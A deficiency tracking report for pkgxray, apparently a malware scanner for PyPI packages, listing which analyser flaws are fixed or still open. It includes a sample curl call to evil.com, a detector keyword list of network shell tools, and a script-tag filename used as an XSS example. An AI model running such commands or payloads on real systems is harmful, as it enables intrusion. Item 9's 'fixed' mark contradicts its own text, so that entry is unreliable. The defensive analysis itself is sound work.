# pkgxray — Deficiency Tracking Report

> **Baseline version analysed:** 0.2.2 (PyPI wheel, first report)  
> **Current HEAD on `main`:** post-0.2.2 (commits `46f6978` and `f7f6dcd`, merged via PR #1 and PR #2)  
> **Report generated:** 2026-05-20  

The table below maps every deficiency documented in the original technical report to its current status in the HEAD of the `main` branch.

---

## Status Key

| Symbol | Meaning |
|:---:|---|
| ✅ | **Fixed** — the deficiency no longer exists in the current code |
| ❌ | **Still open** — the deficiency is unchanged |
| 🆕 | **New** — a deficiency introduced by the recent changes |

---

## Original Deficiencies

---

### 1. ❌ Class-body code not treated as module-level

**Original finding:** Code at class-body scope (outside any method) executes at import time, but `is_module_level()` returns `False` for it because it checks for a `ClassDef` ancestor. This causes under-reporting of severity.

**Example of what is missed:**
```python
class Foo:
    subprocess.run(["curl", "http://evil.com"])  # runs at import — should be CRITICAL
```

**Current status:** `is_module_level()` in `base.py` is **unchanged**. The `ClassDef` check is still present and still causes this false negative. **Not fixed.**

---

### 2. ❌ Module aliasing bypasses subprocess and network detection

**Original finding:** `import subprocess as sp; sp.run(...)` is not detected because the receiver check in `SubprocessAnalyzer` and `NetworkAnalyzer` requires the literal name `subprocess` / `requests` / etc.

**Current status:** The analyser code for `subprocess_calls.py` and `network.py` is **unchanged**. The receiver comparison `func.value.id == "subprocess"` still requires exact naming. **Not fixed.**

---

### 3. ✅ Silent skipping of unparseable files

**Original finding:** Files that fail `ast.parse()` (e.g., due to syntax errors or newer Python syntax) were silently dropped with no warning to the user. There was no indication that analysis coverage was incomplete.

**Current status:** Fixed in commit `46f6978`. The `scanner.py` now pre-parses every `.py` file **before** dispatching to analysers. Failed files are recorded in a new `skipped_files` list on `ScanResult`:

```python
# scanner.py (new)
try:
    ast.parse(extracted_file.content)
except SyntaxError:
    skipped_files.append({
        "filename": extracted_file.filename,
        "reason": "syntax_error",
    })
    continue
```

All three report formats now surface skipped files: the terminal report shows a yellow warning panel, the JSON report includes `files_skipped` count and `skipped_files` list, and the HTML report shows a yellow alert block. **Fixed.**

---

### 4. ✅ `pyproject.toml` and `setup.cfg` not analysed

**Original finding:** These files were extracted but passed to `ast.parse()`, which fails silently since they are TOML/INI format, not Python. No analyser actually inspected their content.

**Current status:** Fixed in commit `46f6978`. A new **`ConfigFileAnalyzer`** (`analyzers/config_files.py`) was added as the 9th analyser. It uses `tomllib` (stdlib in Python 3.11+, with `tomli` as a fallback) for `pyproject.toml` and `configparser` for `setup.cfg`. The scanner now routes config files **exclusively** to `ConfigFileAnalyzer`, skipping all other analysers for them:

```python
# scanner.py (new)
is_config = lower_fn.endswith("pyproject.toml") or lower_fn.endswith("setup.cfg")

for analyzer in analyzers:
    if is_config:
        if not isinstance(analyzer, ConfigFileAnalyzer):
            continue
```

The new analyser detects:
- Suspicious build-time dependencies in `[build-system].requires` (e.g., `requests`, `boto3`)
- Shell commands in entrypoints (e.g., `curl`, `wget`, `bash`)
- Post-install hooks defined via `[tool.*.hooks]`
- Suspicious runtime dependencies in `setup.cfg`'s `[options].install_requires`

**Fixed.**

---

### 5. ❌ `list.remove()` false positive in `FilesystemAnalyzer`

**Original finding:** `FilesystemAnalyzer` flags any call where the method attribute is `remove`, `unlink`, or `rmtree` — regardless of the receiver. This means `my_list.remove(x)` would be reported as a destructive filesystem call.

**Current status:** `filesystem.py` is **unchanged** from the baseline version. The attribute check has no receiver filtering. **Not fixed.**

---

### 6. ❌ `import_module` receiver not verified in `DynamicImportAnalyzer`

**Original finding:** Any `obj.import_module()` call is flagged, not just `importlib.import_module()`. A third-party object with a method named `import_module` would produce a false positive.

**Current status:** `dynamic_imports.py` is **unchanged**. **Not fixed.**

---

### 7. ❌ No analysis of compiled binary extensions

**Original finding:** `.so`, `.pyd`, and `.dll` files inside archives are silently skipped. A C extension that makes dangerous system calls is invisible to the tool.

**Current status:** `extractor.py`'s `_is_python_file()` still returns `False` for binary files. **Not fixed.**

---

### 8. ❌ `ExtractedFile.is_setup` field unused (dead code)

**Original finding:** The `is_setup` field is correctly set on `ExtractedFile` objects but is never read by any analyser or by the scanner orchestrator.

**Current status:** A search of the codebase confirms `is_setup` is still only written (in `extractor.py`) and never read. The scanner still uses a string match on the filename to route `SetupScriptAnalyzer`. **Not fixed.**

---

### 9. ✅ Hardcoded `User-Agent` version string in `downloader.py`

**Original finding:** The `User-Agent` header was hardcoded as `pkgxray/0.1.0` while the package was at `0.2.2`.

> ⚠️ **Uncertainty flag:** This was verified by inspecting the current `downloader.py` in the cloned repo. The string is **still** `pkgxray/0.1.0`. However, this was listed as a deficiency in the context of the version bump from 0.1.x to 0.2.2. The CHANGELOG entry for v0.2.1 notes that `__version__` in `__init__.py` was fixed, so the intent was to correct version strings. The `downloader.py` string appears to have been missed.

**Current status:** The `User-Agent` string in `downloader.py` is **still** `"pkgxray/0.1.0"`. **Not fixed.**

---

### 10. ❌ Hardcoded `version="0.1.0"` in `cli.py`

**Original finding:** `@click.version_option(version="0.1.0")` in `cli.py` reports the wrong version when `pkgxray --version` is called.

**Current status:** `cli.py` is unchanged in the recent commits. The decorator still reads `version="0.1.0"`. **Not fixed.**

---

### 11. ❌ `utils.py` is empty (dead placeholder)

**Original finding:** `utils.py` contains no code and serves no purpose.

**Current status:** `utils.py` remains empty. **Not fixed.**

---

### 12. ✅ Scorer used a single flat cap per analyser, causing inflated scores on legitimate packages

**Original finding (implicit — highlighted as a design consideration):** The single `MAX_SCORE_PER_ANALYZER = 20` cap applied equally to all analysers. Noisy-but-legitimate analysers (e.g., `network` for an HTTP library, `env_access` for a CLI tool) could still contribute up to 20 points each, causing popular legitimate packages like `requests` to score `CRITICAL (74)` and `click` to score `HIGH (60)`.

**Current status:** Fixed in commits `46f6978` and `f7f6dcd`. The scorer now uses **per-analyser caps** (`ANALYZER_CAPS`) calibrated individually:

```python
ANALYZER_CAPS = {
    "obfuscation":     20,  # high-confidence malicious patterns
    "setup_scripts":   20,
    "code_exec":       15,
    "subprocess":      12,
    "filesystem":      12,
    "network":          8,  # capped low — normal for HTTP libraries
    "dynamic_imports":  6,
    "env_access":       5,  # capped low — ubiquitous in CLI tools
}
```

The risk level thresholds were also recalibrated (LOW ≤ 15, MODERATE ≤ 35, HIGH ≤ 60, CRITICAL > 60) and **combo bonuses** were added: combinations of high-severity findings from two related analysers (e.g., `env_access` + `network` → +25 points) push malicious packages higher while keeping legitimate single-purpose packages in their correct band. **Fixed.**

---

### 13. ✅ XSS vulnerability in `generate_html_report()`

**Original finding (implicit — noted only that `<` and `>` were escaped in `code_snippet`, not in other fields):** The original HTML report escaped `code_snippet` manually with `.replace("<", "&lt;")` but did not escape `filename`, `description`, `analyzer_name`, `package_name`, or `version`. A maliciously crafted package name or filename containing `<script>` would result in stored XSS when the HTML report is opened in a browser.

**Current status:** Fixed in commit `f7f6dcd`. The reporter now imports `html` from the standard library and calls `html.escape()` on **all** user-controlled fields before inserting them into the HTML template:

```python
# reporter.py (new)
import html

esc_analyzer  = html.escape(f.analyzer_name)
esc_filename  = html.escape(f.filename)
esc_desc      = html.escape(f.description)
esc_snippet   = html.escape(f.code_snippet[:120])
esc_pkg       = html.escape(result.package_name)
esc_version   = html.escape(result.version)
```

Skipped-file names in the warning block are also escaped via `html.escape(s["filename"])`. **Fixed.**

---

### 14. ❌ `build_parent_map()` called redundantly per analyser

**Original finding:** `build_parent_map()` traverses the entire AST to build the parent map. It is called independently inside `CodeExecAnalyzer`, `NetworkAnalyzer`, and `SubprocessAnalyzer`, meaning the AST is re-traversed three times per file for this purpose alone.

**Current status:** Each of the three analysers still calls `build_parent_map(tree)` independently. There is no shared caching between analysers on the same file. **Not fixed.**

---

### 15. ❌ No caching — every scan re-downloads the package

**Original finding:** There is no caching layer. Scanning the same package twice always downloads and re-extracts it from PyPI.

**Current status:** No caching mechanism was added. **Not fixed.**

---

### 16. ❌ Chained HTTP receiver attributes produce false negatives in `NetworkAnalyzer`

**Original finding:** `self.session.get(url)` is not detected because `func.value` is an `ast.Attribute`, not `ast.Name`, so `receiver` resolves to an empty string and the call is not flagged.

**Current status:** `network.py` is **unchanged**. **Not fixed.**

---

## New Deficiencies Introduced by Recent Changes

---

### 17. 🆕 `ConfigFileAnalyzer` silently does nothing if `tomli`/`tomllib` is unavailable

**Location:** `analyzers/config_files.py`

**Description:** The analyser wraps the `tomllib` import in a try/except chain. If neither `tomllib` (Python 3.11+) nor the `tomli` back-port is importable, `tomllib` is set to `None` and `_check_pyproject()` returns an empty list silently:

```python
try:
    import tomllib
except ImportError:
    try:
        import tomli as tomllib
    except ImportError:
        tomllib = None   # ← silent degradation

def _check_pyproject(content, filename):
    if tomllib is None:
        return []        # ← no warning, no finding
```

Although `tomli` is listed as a conditional dependency in `pyproject.toml` for Python < 3.11, a broken installation or an unexpected environment could lead to `pyproject.toml` files being silently skipped with no user notification. There is no warning logged, no entry added to `skipped_files`, and no indication in any report format that TOML analysis was disabled.

---

### 18. 🆕 `ConfigFileAnalyzer` reports `line_number = 0` for all findings

**Location:** `analyzers/config_files.py`

**Description:** All `Finding` objects produced by `ConfigFileAnalyzer` have `line_number=0`. The TOML and INI parsers used (`tomllib`, `configparser`) do not expose line numbers for individual keys after parsing. While understandable as a limitation, this breaks the contract implied by the `Finding` dataclass and makes it impossible for users to navigate directly to the flagged configuration in their editor. The `code_snippet` field partially compensates (it shows the raw text of the flagged entry), but the `line_number = 0` value is misleading.

---

### 19. 🆕 `ConfigFileAnalyzer` check for shell keywords in entrypoints is naive (string contains, case-sensitive)

**Location:** `analyzers/config_files.py`, `_SHELL_KEYWORDS` check

**Description:** The entrypoint check uses a plain `in` substring test on the target string, without case normalization:

```python
_SHELL_KEYWORDS = {"curl", "wget", "bash", "sh", "nc", "ncat", "python -c", "eval"}

for kw in _SHELL_KEYWORDS:
    if kw in target_str:   # case-sensitive, substring
```

This has two weaknesses:
- **False negative:** `CURL`, `Bash`, or `SH` would not be detected.
- **False positive:** A legitimate Python entrypoint named `mypackage.bash_utils:main` or targeting a function called `shutil_helper` would match `"sh"` as a substring.

---

### 20. 🆕 Combo bonus in scorer fires on legitimate packages that happen to combine analysers

**Location:** `scorer.py`, `DANGEROUS_COMBOS`

**Description:** The combo bonus system adds points when two specific analysers both produce at least one `HIGH`-severity finding. The gate is `max_weight_by_analyzer[a] >= SEVERITY_WEIGHTS[Severity.HIGH]` (i.e., ≥ 7). However, a legitimate package that makes authenticated HTTP calls and reads credentials from environment variables (`env_access=HIGH` + `network=HIGH`) would trigger the `env_access + network` combo bonus of +25 points — pushing it from `MODERATE` into `HIGH` or even `CRITICAL`. The combo was designed for packages that **exfiltrate** credentials, but the distinguishing signal (that both operations happen in the same code path, or at module level) is not checked.

---

### 21. 🆕 `skipped_files` in terminal report truncates filename using `split("/")[-1]`

**Location:** `reporter.py`, `print_terminal_report()`

**Description:** The terminal warning for skipped files extracts the basename with:

```python
skipped_names = ", ".join(s["filename"].split("/")[-1] for s in result.skipped_files[:5])
```

An adversarial filename like `<script>alert(1)</script>.py` contains `/` in `</script>`, so `split("/")[-1]` would yield `script>.py` — silently truncating the filename. This does not cause a security vulnerability in the terminal renderer (rich escapes markup), but it does produce a misleading display. The HTML report correctly uses `html.escape(s["filename"])` before display, so the terminal-specific truncation is inconsistent with that approach.

---

### 22. 🆕 `scan_date` field in the HTML report is not HTML-escaped

**Location:** `reporter.py`, `generate_html_report()`

**Description:** The commit `f7f6dcd` correctly escapes `package_name` and `version` in the HTML report. However, `result.scan_date` (an ISO 8601 UTC timestamp generated by `datetime.now(timezone.utc).isoformat()`) is inserted directly into the HTML without escaping:

```python
# reporter.py — scan_date is not escaped
<div><strong>Paquete:</strong> {esc_pkg} ... <strong>Fecha:</strong> {result.scan_date}</div>
```

`scan_date` is generated internally by the library and is not user-controlled, so this is not an exploitable XSS vector under normal operation. However, it is an inconsistency in the escaping approach and would become a vulnerability if `scan_date` were ever sourced from external input (e.g., a cached result loaded from a JSON file).

---

## Summary Table

| # | Deficiency | Status | Introduced |
|---|---|:---:|---|
| 1 | Class-body code not treated as module-level | ❌ | Baseline |
| 2 | Module aliasing bypasses subprocess/network detection | ❌ | Baseline |
| 3 | Silent skipping of unparseable files | ✅ | Baseline |
| 4 | `pyproject.toml` and `setup.cfg` not analysed | ✅ | Baseline |
| 5 | `list.remove()` false positive in `FilesystemAnalyzer` | ❌ | Baseline |
| 6 | `import_module` receiver not verified | ❌ | Baseline |
| 7 | No analysis of compiled binary extensions | ❌ | Baseline |
| 8 | `ExtractedFile.is_setup` field unused | ❌ | Baseline |
| 9 | Hardcoded `User-Agent` version string in `downloader.py` | ❌ | Baseline |
| 10 | Hardcoded `version="0.1.0"` in `cli.py` | ❌ | Baseline |
| 11 | `utils.py` is empty | ❌ | Baseline |
| 12 | Single flat scorer cap inflates scores on legitimate packages | ✅ | Baseline |
| 13 | XSS vulnerability in `generate_html_report()` | ✅ | Baseline |
| 14 | `build_parent_map()` called redundantly per analyser | ❌ | Baseline |
| 15 | No caching — every scan re-downloads | ❌ | Baseline |
| 16 | Chained HTTP receiver attributes → false negatives | ❌ | Baseline |
| 17 | `ConfigFileAnalyzer` silently disabled if `tomli` unavailable | 🆕 | PR #2 |
| 18 | `ConfigFileAnalyzer` reports `line_number = 0` for all findings | 🆕 | PR #2 |
| 19 | Entrypoint shell-keyword check is naive (case-sensitive substring) | 🆕 | PR #2 |
| 20 | Combo bonus fires on legitimate packages | 🆕 | PR #2 / `f7f6dcd` |
| 21 | Terminal report truncates skipped filenames with `/` split | 🆕 | PR #2 |
| 22 | `scan_date` not HTML-escaped in report | 🆕 | `f7f6dcd` |

**Fixed: 4 of 16 original deficiencies (25%)**  
**New deficiencies introduced: 6**
